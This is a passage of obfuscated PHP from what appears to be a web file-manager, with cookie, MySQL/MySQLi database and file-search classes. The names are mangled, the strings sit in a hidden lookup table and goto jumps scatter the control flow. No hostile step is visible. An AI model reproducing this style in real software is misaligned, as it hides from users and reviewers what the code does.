Action($îˆ‚À¾â[1323])->parsePathChildren($­ÙšÃË®[$îˆ‚À¾â[1314]], array($îˆ‚À¾â[424] => $‰´ãÙôö)); $­ÙšÃË®[$îˆ‚À¾â[1314]] = Action($îˆ‚À¾â[1153])->shareItemInfo($çÛÁ…¦å); } foreach ($­ÙšÃË® as $î›¾í‚ => $Ë†Ã®á…) { if (!in_array($î›¾í‚, array($îˆ‚À¾â[86], $îˆ‚À¾â[87]))) { continue; } foreach ($Ë†Ã®á… as $¼ö÷˜‘Ù => $çÛÁ…¦å) { $çÛÁ…¦å = Action($îˆ‚À¾â[1323])->parsePathChildren($çÛÁ…¦å, array($îˆ‚À¾â[424] => $‰´ãÙôö)); $­ÙšÃË®[$î›¾í‚][$¼ö÷˜‘Ù] = Action($îˆ‚À¾â[1153])->shareItemInfo($çÛÁ…¦å); } } return $­ÙšÃË®; } public function listAll($–´ü¶Ÿ) { $‰èÆ¢ãè =& $_SERVER[ë¦»ºéÌ]; $Ì©†µì“ = IO::listAll($–´ü¶Ÿ); foreach ($Ì©†µì“ as &$åõ½‘…Â) { $›Ëïá³Û = IO::info($åõ½‘…Â[$‰èÆ¢ãè[88]]); $›Ëïá³Û = is_array($›Ëïá³Û) ? $›Ëïá³Û : array(); $åõ½‘…Â = array_merge($›Ëïá³Û, $åõ½‘…Â); $åõ½‘…Â[$‰èÆ¢ãè[97]] = Action($‰èÆ¢ãè[1153])->shareItemInfo($åõ½‘…Â); } unset($åõ½‘…Â); return $Ì©†µì“; } } goto BÙË›òÅã; C¼Ãù×çå: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($®£·öüù = '', $ŒğŸ¶®Ü = 0) { if (is_string($®£·öüù) && $®£·öüù != $_SERVER[ë¦»ºéÌ][12]) { $this->prefix = $®£·öüù; } if (is_numeric($ŒğŸ¶®Ü) && $ŒğŸ¶®Ü > 0) { $this->expire = $ŒğŸ¶®Ü; } } public static function getInstance() { static $’÷³øŞÖ; if ($’÷³øŞÖ === null) { $’÷³øŞÖ = new self(); } return $’÷³øŞÖ; } private static $cookieDisable = false; public static function disable($£†ÁÄ´) { self::$cookieDisable = $£†ÁÄ´; } private static $sameCookieSet = array(); public static function set($õÍÌÚ³€, $œ†»úèĞ, $íÆÇœú = 0, $áÀò¾Ñù = false, $´¦üè±— = false) { $€¬¦Éüœ =& $_SERVER[ë¦»ºéÌ]; if (self::$cookieDisable) { return; } if (!$íÆÇœú) { $íÆÇœú = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$õÍÌÚ³€]) && self::$sameCookieSet[$õÍÌÚ³€] == $œ†»úèĞ . $íÆÇœú) { return; } self::$sameCookieSet[$õÍÌÚ³€] = $œ†»úèĞ . $íÆÇœú; if (!$´¦üè±—) { $´¦üè±— = str_replace(HOST, $€¬¦Éüœ[12], APP_HOST); $´¦üè±— = _get($GLOBALS, $€¬¦Éüœ[862], $´¦üè±—); } $ïÄ£»¸ = $€¬¦Éüœ[12]; setcookie($õÍÌÚ³€, $œ†»úèĞ, time() + $íÆÇœú, $€¬¦Éüœ[8] . trim($´¦üè±—, $€¬¦Éüœ[8]) . $ïÄ£»¸, !1, !1, $áÀò¾Ñù); } public static function setSafe($ÚõÅ‰«¾, $¾î¿¹õ¸, $¯ËÂÀÏ = 0) { self::set($ÚõÅ‰«¾, $¾î¿¹õ¸, $¯ËÂÀÏ, !0); } public static function get($ÔšÁĞûÊ) { static $çİï§á® = false; if (!$çİï§á®) { self::initHeaderCookie(); $çİï§á® = !0; } return isset($_COOKIE[$ÔšÁĞûÊ]) ? $_COOKIE[$ÔšÁĞûÊ] : !1; } private static function initHeaderCookie() { $Ü·ş¶™¿ =& $_SERVER[ë¦»ºéÌ]; if (!isset($_SERVER[$Ü·ş¶™¿[863]]) || !$_SERVER[$Ü·ş¶™¿[863]]) { return; } $¹é¹É¦– = explode($Ü·ş¶™¿[81], $_SERVER[$Ü·ş¶™¿[863]]); foreach ($¹é¹É¦– as $Æ²‹“Éõ) { $Æ²‹“Éõ = explode($Ü·ş¶™¿[864], $Æ²‹“Éõ); if (count($Æ²‹“Éõ) != 2 || !isset($Æ²‹“Éõ[1])) { continue; } $_COOKIE[trim($Æ²‹“Éõ[0])] = trim($Æ²‹“Éõ[1]); } } public static function remove($¯“‹ç, $¼ä¼²¸Š = false) { unset($_COOKIE[$¯“‹ç]); self::set($¯“‹ç, $_SERVER[ë¦»ºéÌ][12], 1, $¼ä¼²¸Š); } } class DbMysql extends Db { public function __construct($üí“¨ˆ = '') { $İÂş£ =& $_SERVER[ë¦»ºéÌ]; if (!extension_loaded($İÂş£[788])) { think_exception(think_lang($İÂş£[24]) . $İÂş£[865]); } if (!empty($üí“¨ˆ)) { $this->config = $üí“¨ˆ; if (empty($this->config[$İÂş£[27]])) { $this->config[$İÂş£[27]] = $İÂş£[12]; } } } public function connect($ºğ£’› = '', $²´¤ŸŠ = 0, $ÑıõŠÕÕ = false) { $¥Òü‘ö’ =& $_SERVER[ë¦»ºéÌ]; if (!isset($this->linkID[$²´¤ŸŠ])) { if (empty($ºğ£’›)) { $ºğ£’› = $this->config; } $õ²øÊß = $ºğ£’›[$¥Òü‘ö’[866]] . ($ºğ£’›[$¥Òü‘ö’[867]] ? "\72{$ºğ£’›[$¥Òü‘ö’[867]]}" : $¥Òü‘ö’[12]); $Îµş‹çş = !empty($ºğ£’›[$¥Òü‘ö’[27]][$¥Òü‘ö’[28]]) ? $ºğ£’›[$¥Òü‘ö’[27]][$¥Òü‘ö’[28]] : $this->pconnect; if ($Îµş‹çş) { $this->linkID[$²´¤ŸŠ] = mysql_pconnect($õ²øÊß, $ºğ£’›[$¥Òü‘ö’[868]], $ºğ£’›[$¥Òü‘ö’[869]], 131072); } else { $this->linkID[$²´¤ŸŠ] = mysql_connect($õ²øÊß, $ºğ£’›[$¥Òü‘ö’[868]], $ºğ£’›[$¥Òü‘ö’[869]], !0, 131072); } if (!$this->linkID[$²´¤ŸŠ] || !empty($ºğ£’›[$¥Òü‘ö’[31]]) && !mysql_select_db($ºğ£’›[$¥Òü‘ö’[31]], $this->linkID[$²´¤ŸŠ])) { think_exception(mysql_error()); } $”ìº‚«š = mysql_get_server_info($this->linkID[$²´¤ŸŠ]); mysql_query($¥Òü‘ö’[870] . think_config($¥Òü‘ö’[871]) . $¥Òü‘ö’[68], $this->linkID[$²´¤ŸŠ]); if ($”ìº‚«š > $¥Òü‘ö’[872]) { mysql_query($¥Òü‘ö’[873], $this->linkID[$²´¤ŸŠ]); } $this->connected = !0; if (1 != think_config($¥Òü‘ö’[32])) { unset($this->config); } } return $this->linkID[$²´¤ŸŠ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¸Óø²ïı) { $ÊÆ¿¡Ş† =& $_SERVER[ë¦»ºéÌ]; if (0 === stripos($¸Óø²ïı, $ÊÆ¿¡Ş†[270])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¸Óø²ïı; if ($this->queryID) { $this->free(); } think_action_status($ÊÆ¿¡Ş†[33], 1); think_status($ÊÆ¿¡Ş†[34]); $this->queryID = mysql_query($¸Óø²ïı, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($°µºûÃ‹) { $ï‹œ¹Şæ =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $°µºûÃ‹; if ($this->queryID) { $this->free(); } think_action_status($ï‹œ¹Şæ[35], 1); think_status($ï‹œ¹Şæ[34]); $Ïùå©®ê = mysql_query($°µºûÃ‹, $this->_linkID); $this->debug(); if (!1 === $Ïùå©®ê) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ë¦»ºéÌ][874], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ñìÈÄñ = mysql_query($_SERVER[ë¦»ºéÌ][875], $this->_linkID); $this->transTimes = 0; if (!$ñìÈÄñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $®ôÚàº = mysql_query($_SERVER[ë¦»ºéÌ][876], $this->_linkID); $this->transTimes = 0; if (!$®ôÚàº) { $this->error(); return !1; } } return !0; } private function getAll() { $§˜ò³Ş› = array(); if ($this->numRows > 0) { while ($…ó›Æå = mysql_fetch_assoc($this->queryID)) { $§˜ò³Ş›[] = $…ó›Æå; } mysql_data_seek($this->queryID, 0); } return $§˜ò³Ş›; } public function getFields($¼ïĞÕì¼) { $ûûÏŒå½ =& $_SERVER[ë¦»ºéÌ]; $Èá­¢ß’ = $this->query($ûûÏŒå½[877] . $this->parseKey($¼ïĞÕì¼)); $Š¦™ëƒí = array(); if ($Èá­¢ß’) { foreach ($Èá­¢ß’ as $Ç×Û°¼ù => $²„à‰¨ ) { $Š¦™ëƒí[$²„à‰¨ [$ûûÏŒå½[41]]] = array($ûûÏŒå½[42] => $²„à‰¨ [$ûûÏŒå½[41]], $ûûÏŒå½[43] => $²„à‰¨ [$ûûÏŒå½[44]], $ûûÏŒå½[45] => (bool) (strtoupper($²„à‰¨ [$ûûÏŒå½[46]]) === $ûûÏŒå½[878]), $ûûÏŒå½[47] => $²„à‰¨ [$ûûÏŒå½[48]], $ûûÏŒå½[49] => strtolower($²„à‰¨ [$ûûÏŒå½[50]]) == $ûûÏŒå½[51], $ûûÏŒå½[52] => strtolower($²„à‰¨ [$ûûÏŒå½[53]]) == $ûûÏŒå½[54]); } } return $Š¦™ëƒí; } public function getTables($³‹Ï’á² = '') { $Œœ¹Œ£ =& $_SERVER[ë¦»ºéÌ]; if (!empty($³‹Ï’á²)) { $Ğë¡ñù€ = $Œœ¹Œ£[879] . $³‹Ï’á² . $Œœ¹Œ£[880]; } else { $Ğë¡ñù€ = $Œœ¹Œ£[881]; } $·¼„¼¤È = $this->query($Ğë¡ñù€); $¤í™“ Õ = array(); foreach ($·¼„¼¤È as $³¼ô¢É¾ => $“îşê») { $¤í™“ Õ[$³¼ô¢É¾] = current($“îşê»); } return $¤í™“ Õ; } public function replace($Ñ”Â¸ó, $İçı¹Â = array()) { $ÁïÕı˜£ =& $_SERVER[ë¦»ºéÌ]; foreach ($Ñ”Â¸ó as $¾ˆ™Ä => $şÖø¤ıİ) { $µ°Ğëšñ = $this->parseValue($şÖø¤ıİ); if (is_scalar($µ°Ğëšñ)) { $Ş‹ Ì®­[] = $µ°Ğëšñ; $³‰¶âÙÕ[] = $this->parseKey($¾ˆ™Ä); } } $ïûÏ…’æ = $ÁïÕı˜£[882] . $this->parseTable($İçı¹Â[$ÁïÕı˜£[285]]) . $ÁïÕı˜£[883] . implode($ÁïÕı˜£[60], $³‰¶âÙÕ) . $ÁïÕı˜£[884] . implode($ÁïÕı˜£[60], $Ş‹ Ì®­) . $ÁïÕı˜£[885]; return $this->execute($ïûÏ…’æ); } public function insertAll($Ïú†×­ç, $´Ò¼ª÷ = array(), $Ü¢’Ñ´® = false) { $§Ëê¬² =& $_SERVER[ë¦»ºéÌ]; if (!is_array($Ïú†×­ç[0])) { return !1; } $åÅ¡Ûæä = array_keys($Ïú†×­ç[0]); $¢¢ïò = array(); foreach ($Ïú†×­ç as $ÙÈ†àâŞ) { $ï¼ë„Š¶ = array(); foreach ($ÙÈ†àâŞ as $æÁ¥‡ú => $áóò™ãË) { $áóò™ãË = $this->parseValue($áóò™ãË); if (is_scalar($áóò™ãË)) { $ï¼ë„Š¶[] = $áóò™ãË; } } $¢¢ïò[] = $§Ëê¬²[266] . implode($§Ëê¬²[60], $ï¼ë„Š¶) . $§Ëê¬²[885]; } array_walk($åÅ¡Ûæä, array($this, $§Ëê¬²[886])); $¼¦‡ = ($Ü¢’Ñ´® ? $§Ëê¬²[887] : $§Ëê¬²[888]) . $§Ëê¬²[889] . $this->parseTable($´Ò¼ª÷[$§Ëê¬²[285]]) . $§Ëê¬²[883] . implode($§Ëê¬²[60], $åÅ¡Ûæä) . $§Ëê¬²[890] . implode($§Ëê¬²[60], $¢¢ïò); return $this->execute($¼¦‡); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $×Ù¶®¶‹ =& $_SERVER[ë¦»ºéÌ]; $this->error = mysql_errno() . $×Ù¶®¶‹[4] . mysql_error($this->_linkID); if ($×Ù¶®¶‹[12] != $this->queryStr) { $this->error .= LNG($×Ù¶®¶‹[58]) . $this->queryStr; } think_trace($this->error, $×Ù¶®¶‹[12], $×Ù¶®¶‹[59]); return $this->error; } public function escapeString($ªÈ‡¿Ú) { if ($this->_linkID) { return mysql_real_escape_string($ªÈ‡¿Ú, $this->_linkID); } else { return mysql_escape_string($ªÈ‡¿Ú); } } public function parseKey(&$•Ô«€İ, $™©åøø = true) { $®‚ªŸÂã =& $_SERVER[ë¦»ºéÌ]; if ($™©åøø) { $•Ô«€İ = $this->parseKeyCheck($•Ô«€İ); } if ($•Ô«€İ != $®‚ªŸÂã[193] && !preg_match($®‚ªŸÂã[891], $•Ô«€İ)) { $•Ô«€İ = $®‚ªŸÂã[391] . trim($•Ô«€İ, $®‚ªŸÂã[391]) . $®‚ªŸÂã[391]; } return $•Ô«€İ; } } class DbMysqli extends Db { public function __construct($«óÅÅ“Á = '') { $Š¦½¨ã =& $_SERVER[ë¦»ºéÌ]; if (!extension_loaded($Š¦½¨ã[892])) { think_exception(think_lang($Š¦½¨ã[24]) . $Š¦½¨ã[893]); } if (!empty($«óÅÅ“Á)) { $this->config = $«óÅÅ“Á; if (empty($this->config[$Š¦½¨ã[27]])) { $this->config[$Š¦½¨ã[27]] = $Š¦½¨ã[12]; } } } public function connect($È¢²í§³ = '', $‚éşûé‚ = 0) { $ÖÇâ¼ =& $_SERVER[ë¦»ºéÌ]; if (!isset($this->linkID[$‚éşûé‚])) { if (empty($È¢²í§³)) { $È¢²í§³ = $this->config; } $this->linkID[$‚éşûé‚] = new mysqli($È¢²í§³[$ÖÇâ¼[866]], $È¢²í§³[$ÖÇâ¼[868]], $È¢²í§³[$ÖÇâ¼[869]], $È¢²í§³[$ÖÇâ¼[31]], $È¢²í§³[$ÖÇâ¼[867]] ? intval($È¢²í§³[$ÖÇâ¼[867]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $°˜®ïÙ = $this->linkID[$‚éşûé‚]->server_version; $this->linkID[$‚éşûé‚]->query($ÖÇâ¼[870] . think_config($ÖÇâ¼[871]) . $ÖÇâ¼[68]); if ($°˜®ïÙ > $ÖÇâ¼[872]) { $this->linkID[$‚éşûé‚]->query($ÖÇâ¼[873]); } $this->connected = !0; if (1 != think_config($ÖÇâ¼[32])) { unset($this->config); } } return $this->linkID[$‚éşûé‚]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ƒØ×í£’) { $ù»—«‡ =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒØ×í£’; if ($this->queryID) { $this->free(); } think_action_status($ù»—«‡[33], 1); think_status($ù»—«‡[34]); $this->queryID = $this->_linkID->query($ƒØ×í£’); if ($this->_linkID->more_results()) { while (($›Çê¸òú = $this->_linkID->next_result()) != NULL) { $›Çê¸òú->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($»Şí£‰‚) { $ŒÌƒÂš† =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $»Şí£‰‚; if ($this->queryID) { $this->free(); } think_action_status($ŒÌƒÂš†[35], 1); think_status($ŒÌƒÂš†[34]); $¥‚Ñ¡°¯ = $this->_linkID->query($»Şí£‰‚); $this->debug(); if (!1 === $¥‚Ñ¡°¯) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Î²‰é¸‘ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Î²‰é¸‘) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $õ­ÜÁ—õ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$õ­ÜÁ—õ) { $this->error(); return !1; } } return !0; } private function getAll() { $ë˜©÷şÁ = array(); if ($this->numRows > 0) { for ($Õåêş·ş = 0; $Õåêş·ş < $this->numRows; $Õåêş·ş++) { $ë˜©÷şÁ[$Õåêş·ş] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ë˜©÷şÁ; } public function getFields($ßÑú¨’ú) { $îÚŠ¬¦ =& $_SERVER[ë¦»ºéÌ]; $Œì€Îô¼ = $this->query($îÚŠ¬¦[877] . $this->parseKey($ßÑú¨’ú)); $•øŠ†Ö– = array(); if ($Œì€Îô¼) { foreach ($Œì€Îô¼ as $ò±¯‚« => $çÁúüĞó) { $•øŠ†Ö–[$çÁúüĞó[$îÚŠ¬¦[41]]] = array($îÚŠ¬¦[42] => $çÁúüĞó[$îÚŠ¬¦[41]], $îÚŠ¬¦[43] => $çÁúüĞó[$îÚŠ¬¦[44]], $îÚŠ¬¦[45] => (bool) ($çÁúüĞó[$îÚŠ¬¦[46]] === $îÚŠ¬¦[12]), $îÚŠ¬¦[47] => $çÁúüĞó[$îÚŠ¬¦[48]], $îÚŠ¬¦[49] => strtolower($çÁúüĞó[$îÚŠ¬¦[50]]) == $îÚŠ¬¦[51], $îÚŠ¬¦[52] => strtolower($çÁúüĞó[$îÚŠ¬¦[53]]) == $îÚŠ¬¦[54]); } } return $•øŠ†Ö–; } public function getTables($äØ¤ÁÆ = '') { $Øê…º³Ø =& $_SERVER[ë¦»ºéÌ]; $ş³†®®Å = !empty($äØ¤ÁÆ) ? $Øê…º³Ø[879] . $äØ¤ÁÆ . $Øê…º³Ø[880] : $Øê…º³Ø[881]; $ËûËê…§ = $this->query($ş³†®®Å); $õëçˆ¼ = array(); if ($ËûËê…§) { foreach ($ËûËê…§ as $ç£ı…® => $™·Øöúü) { $õëçˆ¼[$ç£ı…®] = current($™·Øöúü); } } return $õëçˆ¼; } public function replace($¿½™ñÇ, $ëà‹Á™ó = array()) { $‡¿Àñ‘‚ =& $_SERVER[ë¦»ºéÌ]; foreach ($¿½™ñÇ as $šÒÜá¹ => $÷å¥£) { $õ—ú’ÒÏ = $this->parseValue($÷å¥£); if (is_scalar($õ—ú’ÒÏ)) { $•‹¡¢”œ[] = $õ—ú’ÒÏ; $³ã‹»Û[] = $this->parseKey($šÒÜá¹); } } $®¹‹Æ—¶ = $‡¿Àñ‘‚[882] . $this->parseTable($ëà‹Á™ó[$‡¿Àñ‘‚[285]]) . $‡¿Àñ‘‚[883] . implode($‡¿Àñ‘‚[60], $³ã‹»Û) . $‡¿Àñ‘‚[884] . implode($‡¿Àñ‘‚[60], $•‹¡¢”œ) . $‡¿Àñ‘‚[885]; return $this->execute($®¹‹Æ—¶); } public function insertAll($°Ú ùßä, $Ã§íÆòù = array(), $–¼ƒ‰˜­ = false) { $—³«¥öô =& $_SERVER[ë¦»ºéÌ]; if (!is_array($°Ú ùßä[0])) { return !1; } $±ÚÆ§ÎÏ = array_keys($°Ú ùßä[0]); $Õ€àƒ¯ = array(); foreach ($°Ú ùßä as $§¹ğ¡±) { $ˆß„‚óñ = array(); foreach ($§¹ğ¡± as $éœ…›Óı => $–çø‘¢Â) { $–çø‘¢Â = $this->parseValue($–çø‘¢Â); if (is_scalar($–çø‘¢Â)) { $ˆß„‚óñ[] = $–çø‘¢Â; } } $Õ€àƒ¯[] = $—³«¥öô[266] . implode($—³«¥öô[60], $ˆß„‚óñ) . $—³«¥öô[885]; } array_walk($±ÚÆ§ÎÏ, array($this, $—³«¥öô[886])); $ã¡Õ£ü‚ = $–¼ƒ‰˜­ ? $—³«¥öô[887] : $—³«¥öô[888]; $™Æ¸åú« = $ã¡Õ£ü‚ . $—³«¥öô[889] . $this->parseTable($Ã§íÆòù[$—³«¥öô[285]]) . $—³«¥öô[883] . implode($—³«¥öô[60], $±ÚÆ§ÎÏ) . $—³«¥öô[890] . implode($—³«¥öô[60], $Õ€àƒ¯); return $this->execute($™Æ¸åú«); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $õ–¨¶î‡ =& $_SERVER[ë¦»ºéÌ]; $this->error = $this->_linkID->errno . $õ–¨¶î‡[4] . $this->_linkID->error; if ($õ–¨¶î‡[12] != $this->queryStr) { $this->error .= LNG($õ–¨¶î‡[58]) . $this->queryStr; } think_trace($this->error, $õ–¨¶î‡[12], $õ–¨¶î‡[59]); return $this->error; } public function escapeString($àüÅŞ•£) { if ($this->_linkID) { return $this->_linkID->real_escape_string($àüÅŞ•£); } else { return addslashes($àüÅŞ•£); } } public function parseKey(&$âê™ˆ», $°Ï‹±² = true) { $»ƒ¾š´ƒ =& $_SERVER[ë¦»ºéÌ]; if ($°Ï‹±²) { $âê™ˆ» = $this->parseKeyCheck($âê™ˆ»); } if ($âê™ˆ» != $»ƒ¾š´ƒ[193] && !preg_match($»ƒ¾š´ƒ[891], $âê™ˆ»)) { $âê™ˆ» = $»ƒ¾š´ƒ[391] . trim($âê™ˆ», $»ƒ¾š´ƒ[391]) . $»ƒ¾š´ƒ[391]; } return $âê™ˆ»; } } goto f¸©ğ¬¼÷; CªØåÌ…ß†: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ïÎóË¯) { $ÖöûŒ»Ã =& $_SERVER[ë¦»ºéÌ]; $ñ…Ö¡ÊÈ = KodIO::fileTypeList(); $ƒ³‹™Êò = $ñ…Ö¡ÊÈ[$ïÎóË¯]; if (!$ƒ³‹™Êò) { return array(); } $°š¢İ = $ƒ³‹™Êò[$ÖöûŒ»Ã[179]]; $¿˜üÎË„ = $ÖöûŒ»Ã[7]; if (!$ƒ³‹™Êò[$ÖöûŒ»Ã[179]]) { $©úÄ¾°ƒ = array_to_keyvalue($ñ…Ö¡ÊÈ, $ÖöûŒ»Ã[12], $ÖöûŒ»Ã[179]); $°š¢İ = implode($ÖöûŒ»Ã[60], $©úÄ¾°ƒ); $¿˜üÎË„ = $ÖöûŒ»Ã[2045]; } $‚¶Ùâ¹Ä = explode($ÖöûŒ»Ã[60], trim($°š¢İ, $ÖöûŒ»Ã[60])); return array($¿˜üÎË„, $‚¶Ùâ¹Ä); } public function listPathType($ãâï¤Õ×) { $Í•˜—ß  =& $_SERVER[ë¦»ºéÌ]; $æË·ñ‡¾ = $this->fileTypeWhere($ãâï¤Õ×); if (!$æË·ñ‡¾) { return array(); } $‘ ·¯Ğ = array($Í•˜—ß [582] => SourceModel::TYPE_USER, $Í•˜—ß [583] => USER_ID, $Í•˜—ß [579] => 0, $Í•˜—ß [580] => $æË·ñ‡¾); return $this->listSource($‘ ·¯Ğ); } public function listSearch($Ì±ˆşéã, $ÔÀ„êëç = 300) { $áÀ™ºŸ¶ =& $_SERVER[ë¦»ºéÌ]; if (isset($Ì±ˆşéã[$áÀ™ºŸ¶[1891]]) && $Ì±ˆşéã[$áÀ™ºŸ¶[1891]]) { $Ì±ˆşéã[$áÀ™ºŸ¶[1891]] = str_replace($áÀ™ºŸ¶[390], $áÀ™ºŸ¶[2046], trim($Ì±ˆşéã[$áÀ™ºŸ¶[1891]])); } $˜¾û¹¾¢ = $this->_parseSearchWhere($Ì±ˆşéã); $¬ü¬¬üØ = $˜¾û¹¾¢; if (!isset($˜¾û¹¾¢[$áÀ™ºŸ¶[433]])) { $˜¾û¹¾¢[$áÀ™ºŸ¶[433]] = 0; } $¯ğÂš÷ô = $áÀ™ºŸ¶[2047]; $ç¾Ûš”Á = $¯ğÂš÷ô; $this->_listSearchBindPinyin($Ì±ˆşéã, $˜¾û¹¾¢, $¯ğÂš÷ô); $this->alias($áÀ™ºŸ¶[446])->_makeOrder(); $˜¾û¹¾¢ = $this->parseWhereLike($˜¾û¹¾¢); $“”½£àş = $this->distinct(!0)->field($¯ğÂš÷ô)->where($˜¾û¹¾¢)->selectPage($ÔÀ„êëç); $this->_listSearchFileContent($“”½£àş, $Ì±ˆşéã, $ç¾Ûš”Á, $¬ü¬¬üØ); $this->_listSearchDesc($“”½£àş, $Ì±ˆşéã, $ç¾Ûš”Á); $this->_listSearchTag($“”½£àş, $Ì±ˆşéã, $ç¾Ûš”Á); $this->_listSearchGroupTag($“”½£àş, $Ì±ˆşéã, $ç¾Ûš”Á); $this->_listDataApply($“”½£àş[$áÀ™ºŸ¶[375]]); $this->_listMake($“”½£àş); return $“”½£àş; } private function _listSearchFileContent(&$â „ğ¼Ø, $èºŒù£², $×õæ”ùá, $¤íÖ´ñ) { $æ´ß£³ =& $_SERVER[ë¦»ºéÌ]; if (!$èºŒù£²[$æ´ß£³[1891]] || $â „ğ¼Ø[$æ´ß£³[372]][$æ´ß£³[359]] > 1) { return; } if (!isset($¤íÖ´ñ[$æ´ß£³[42]]) || !is_array($èºŒù£²[$æ´ß£³[469]])) { return; } $¤íÖ´ñ[$æ´ß£³[469]] = array($æ´ß£³[7], $èºŒù£²[$æ´ß£³[469]]); unset($¤íÖ´ñ[$æ´ß£³[42]]); unset($èºŒù£²[$æ´ß£³[469]]); $ı†ë±™â = $this->field($×õæ”ùá)->where($¤íÖ´ñ)->limit($æ´ß£³[2048])->select(); if (!$ı†ë±™â || count($ı†ë±™â) == 0) { return; } $â „ğ¼Ø[$æ´ß£³[375]] = array_merge($ı†ë±™â, $â „ğ¼Ø[$æ´ß£³[375]]); $â „ğ¼Ø[$æ´ß£³[372]][$æ´ß£³[373]] += count($ı†ë±™â); } private function _listSearchTag(&$¹¨õâà, $£­êÖˆ, $áüí˜¿¥) { $ş‹¡«”³ =& $_SERVER[ë¦»ºéÌ]; if (!$£­êÖˆ[$ş‹¡«”³[1891]] || $¹¨õâà[$ş‹¡«”³[372]][$ş‹¡«”³[359]] > 1) { return; } $ß©Ó…† = Model($ş‹¡«”³[2049])->listData(); $ì“Úş–‹ = array(); $ÇĞºšé¢ = $£­êÖˆ[$ş‹¡«”³[1891]]; foreach ($ß©Ó…† as $ºˆ†½‹) { $í™´µ¿ˆ = $ºˆ†½‹[$ş‹¡«”³[42]]; $¾òô±ƒÌ = str_replace($ş‹¡«”³[63], $ş‹¡«”³[12], Pinyin::get($í™´µ¿ˆ)); if (stripos($í™´µ¿ˆ, $ÇĞºšé¢) !== !1 || stripos($¾òô±ƒÌ, $ÇĞºšé¢) !== !1) { $ì“Úş–‹[] = $ºˆ†½‹[$ş‹¡«”³[403]]; } } if (!$ì“Úş–‹) { return; } $‰ÖâÈØò = array($ş‹¡«”³[429] => array($ş‹¡«”³[7], $ì“Úş–‹), $ş‹¡«”³[1632] => USER_ID); $ÜÄ›ĞÙğ = Model($ş‹¡«”³[430])->field($ş‹¡«”³[88])->where($‰ÖâÈØò)->select(); $ÜÄ›ĞÙğ = array_to_keyvalue($ÜÄ›ĞÙğ, $ş‹¡«”³[12], $ş‹¡«”³[88]); $©Ë£÷›Û = array_unique($ÜÄ›ĞÙğ); $this->_listSearchMerge($¹¨õâà, $£­êÖˆ, $áüí˜¿¥, $©Ë£÷›Û); } private function _listSearchDesc(&$¸ı¦‰¹©, $›½ª‘, $Ş‡©¹±ø) { $´—ˆÎ”© =& $_SERVER[ë¦»ºéÌ]; if (!$›½ª‘[$´—ˆÎ”©[1891]] || $¸ı¦‰¹©[$´—ˆÎ”©[372]][$´—ˆÎ”©[359]] > 1) { return; } $ıÓ±ÆŠÉ = $this->listSearchChildren($›½ª‘[$´—ˆÎ”©[500]]); $ıÓ±ÆŠÉ = array_unique($ıÓ±ÆŠÉ); if (!$ıÓ±ÆŠÉ) { return; } $—¹ÙŒ±Ï = array($´—ˆÎ”©[405] => array($´—ˆÎ”©[7], $ıÓ±ÆŠÉ), $´—ˆÎ”©[105] => $´—ˆÎ”©[453], $´—ˆÎ”©[380] => array($´—ˆÎ”©[389], $´—ˆÎ”©[1893] . $›½ª‘[$´—ˆÎ”©[1891]] . $´—ˆÎ”©[1893])); $¡½­‰ª„ = Model($´—ˆÎ”©[565])->field($´—ˆÎ”©[405])->where($—¹ÙŒ±Ï)->select(); $ç¯Å÷óÜ = array_to_keyvalue($¡½­‰ª„, $´—ˆÎ”©[12], $´—ˆÎ”©[405]); $this->_listSearchMerge($¸ı¦‰¹©, $›½ª‘, $Ş‡©¹±ø, $ç¯Å÷óÜ); } private function _listSearchGroupTag(&$ƒĞÄ’„Å, $­½èÙ, $½¸ªÅµ) { $”Í³áŠ =& $_SERVER[ë¦»ºéÌ]; if (!$­½èÙ[$”Í³áŠ[1891]] || $ƒĞÄ’„Å[$”Í³áŠ[372]][$”Í³áŠ[359]] > 1 || !$­½èÙ[$”Í³áŠ[500]]) { return; } $ˆ°ø˜íè = $this->sourceInfo($­½èÙ[$”Í³áŠ[500]]); if (!$ˆ°ø˜íè || $ˆ°ø˜íè[$”Í³áŠ[414]] != SourceModel::TYPE_GROUP) { return; } $ö¢³èğ¡ = $ˆ°ø˜íè[$”Í³áŠ[506]]; $ê‡è„Ø• = Model($”Í³áŠ[2050])->get($ö¢³èğ¡); $áÀö¾š = array(); $äüÒ = $­½èÙ[$”Í³áŠ[1891]]; foreach 